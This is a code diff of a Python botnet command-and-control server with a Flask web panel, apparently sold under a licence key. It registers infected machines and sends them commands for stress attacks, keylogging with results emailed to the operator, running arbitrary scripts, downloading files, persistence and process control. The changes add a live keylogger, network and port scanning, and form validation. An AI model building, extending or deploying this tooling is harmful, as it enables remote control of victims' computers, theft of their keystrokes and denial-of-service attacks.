@@ -29,7 +29,7 @@ from tkinter import *
 from flask import *
 
 # Server info
-ippp      	= "IP_HERE" 			# IP_HERE
+ippp      	= "IP_HERE" 	# IP_HERE
 port_    	= "PORT_HERE"			# PORT_HERE
 port   		= int(port_)
 
@@ -454,13 +454,13 @@ class encryption:
 # Un Comment this function before release
 def getchecksum():
 	path = os.path.basename(__file__)
-	# if not os.path.exists(path): path = path[:-2] + "py"
-	# md5_hash = hashlib.md5()
-	# a_file = open(path,"rb")
-	# content = a_file.read()
-	# md5_hash.update(content)
-	# digest = md5_hash.hexdigest()
-	return path
+	if not os.path.exists(path): path = path[:-2] + "py"
+	md5_hash = hashlib.md5()
+	a_file = open(path,"rb")
+	content = a_file.read()
+	md5_hash.update(content)
+	digest = md5_hash.hexdigest()
+	return digest
 
 keyauthapp = api(
     name = "BotNet Auth",
@@ -510,6 +510,7 @@ idNum       	= 0		# Bot ID number
 database    	= []	# list of all clients
 out 			= ""	# Command output
 shell_out 	    = ""	# Shell Command output
+keylogger_out	= ""	# Keylogger output
 maxWorkers		= 500	# Max number of workers
 
 temp 			= os.getenv('temp')
@@ -595,16 +596,14 @@ def collect():
 			conn, address = sock.accept()
 			all_connections.append(conn)
 			all_address.append(address)
-		except socket.timeout: continue
-		except socket.error: continue
-		except Exception as e: print_debug("Error accepting connections: " + str(e))
-		try:
-			all_connections[-1].send("sendinfo".encode())
-			out = f'{all_connections[-1].recv(1024*5).decode("ascii")}'
+
+			conn.send("sendinfo".encode())
+			out = f'{conn.recv(1024*5).decode("ascii")}'
 
 			out = out.split()
 			info = {}
-			info['COMMAND'] 	= 'INFO'
+			info['COMMAND'] = 'INFO'
+			
 			if hostname_list != []:					# if there are clients in the list
 				if out[1] not in hostname_list:
 					info["IP"] 			= out[0]
@@ -620,21 +619,23 @@ def collect():
 
 					database.append(client(info))
 				else: print_debug("Collect Thread: client already in database")
+			
 			else:
-				print_debug("Collect Thread: No clients in list adding new client")
-				print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
-				info["IP"] 			= out[0]
-				info["hostname"] 	= out[1]
-				info["OS"] 			= out[2]
-				info["status"]  	= str(out[3])
+					print_debug("Collect Thread: No clients in list adding new client")
+					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
+					info["IP"] 			= out[0]
+					info["hostname"] 	= out[1]
+					info["OS"] 			= out[2]
+					info["status"]  	= str(out[3])
 
-				hostname_list.append(out[1])
-				public_ips.append(out[0])
-				database.append(client(info))
-		except BrokenPipeError:
-			del all_address[-1]
-			del all_connections[-1]
-		sleep(0.5)
+					hostname_list.append(out[1])
+					public_ips.append(out[0])
+					database.append(client(info))
+		
+		except socket.timeout: continue
+		except socket.error: continue
+		except Exception as e: print_debug("Error accepting connections: " + str(e))
+		sleep(2)
 
 def check(display:bool=False, always:bool=True):
 	global all_ids
@@ -695,6 +696,11 @@ def _take_cmd(bot, cmd):
 	elif cmd == "stopprocessscontrol":
 		return call_script(bot, cmd)
 
+	elif cmd == "networkscan":
+		return call_script(bot, cmd)
+
+	elif cmd == "livekeyylogger":
+		return call_script(bot, cmd)
 
 
 	elif "processcontrol" in cmd:
@@ -718,6 +724,9 @@ def _take_cmd(bot, cmd):
 	elif "persistance" in cmd:
 		return call_script(bot, cmd)
 
+	elif "portscan" in cmd:
+		return call_script(bot, cmd)
+
 	else: return(f"Error: {cmd} is not a valid command")
 
 def _take_shell_cmd(i, cmd):
@@ -727,40 +736,54 @@ def _take_shell_cmd(i, cmd):
 	except BrokenPipeError:
 		del all_address[i]
 		del all_connections[i]
-	return(f"Error")
+	except: return(f"Error")
 
 def command_check(command):
 	if command == "stress": 
 		stress_time 	= request.form.get('stress-time')
 		stress_amount 	= request.form.get('stress-tasks')
-		return (f'{command} {stress_time} {stress_amount}')
+		if stress_time == "" or stress_amount == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {stress_time} {stress_amount}')
 
 	elif command == "keylogger":
 		keylogger_intervals 		= request.form.get('keylogger-intervals')
 		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
-		return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
+		if keylogger_intervals == None or keylogger_reciever_email == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
 
 	elif command == "runscript":
 		script_name 	= request.form.get('runscript-name')
 		script_code 	= request.form.get('runscript-code')
 		script_type 	= request.form.get('script-type-selection')
-		return (f'{command} {script_name} {script_type} {script_code}')
+		if script_name == None or script_code == None or script_type == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {script_name} {script_type} {script_code}')
 
 	elif command == "download":
 		download_path 	= request.form.get('download-path')
-		return (f'{command} {download_path}')
+		if download_path == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {download_path}')
 
 	elif command == "scanfiles":
 		scan_files 		= request.form.get('scan-files')
-		return (f'{command} {scan_files}')
+		if scan_files == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {scan_files}')
 
 	elif command == "processcontrol":
 		process_names 	= request.form.get('process-names')
-		return (f'{command} {process_names}')
+		if process_names == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {process_names}')
 
 	elif command == "persistance":
 		persistance_name = request.form.get('persistance-name')
-		return (f'{command} {persistance_name}')
+		if persistance_name == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {persistance_name}')
+
+	elif command == "portscan":
+		port_scan_starting_port = request.form.get('portscan-starting-port')
+		port_scan_ending_port 	= request.form.get('portscan-ending-port')
+		port_scan_threads 		= request.form.get('portscan-threads')
+		if port_scan_starting_port == None or port_scan_ending_port == None or port_scan_threads == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {port_scan_starting_port} {port_scan_ending_port} {port_scan_threads}')
 
 	else: return command
 #endregion
@@ -825,23 +848,33 @@ def sendcommands():
 				command = ""
 
 				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', out=out)
+                
+				if command_ == "": return render_template('sendcommands.html', commandStatus='No command selected', out=out)
 
-				if command_ == "clear":
+				elif command_ == "clear":
 					out = "" # clear output
 					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
 
+				elif command_ == "listbots":
+					out += f"\n\nConnected bots: {str(len(database))}"
+					return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+
 				else:
-					command += str(command_check(str(command_)))
-					print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))
-					for x in database:
-						if str(x.idNum) == str(idNumber):
-							try: 
-								out += "\n\n" + x.hostname + ": " + _take_cmd(int(x.idNum), str(command))
-								return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-							except Exception as e: 
-								print_debug("Error while sending command" + str(e))
-								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-					return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
+					commandCheck = str(command_check(str(command_)))
+					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, out=out)
+					else:
+						command += commandCheck
+
+						print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))
+						for x in database:
+							if str(x.idNum) == str(idNumber):
+								try: 
+									out += "\n\n" + x.hostname + ": " + _take_cmd(int(x.idNum), str(command))
+									return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+								except Exception as e: 
+									print_debug("Error while sending command" + str(e))
+									return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+						return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
 			
 			else: return render_template('sendcommands.html', commandOutput=out)
 
